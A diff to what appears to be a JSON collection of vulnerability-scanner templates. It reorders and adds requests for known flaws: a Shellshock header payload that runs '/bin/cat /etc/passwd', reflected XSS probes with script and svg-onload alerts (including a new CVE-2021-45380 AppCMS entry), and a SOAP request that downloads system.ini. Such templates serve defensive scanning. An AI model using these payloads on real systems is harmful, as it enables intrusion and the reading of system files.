@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6044,7 +6044,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E",
+            "{{BaseURL}}/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B",
             "{{BaseURL}}/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E"
           ]
         }
@@ -10244,9 +10244,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -14932,6 +14932,21 @@
           "method": "GET",
           "path": [
             "{{RootURL}}/apisix/admin/migrate/export"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-45380",
+      "info": {
+        "name": "AppCMS - Reflected Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/templates/m/inc_head.php?q=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
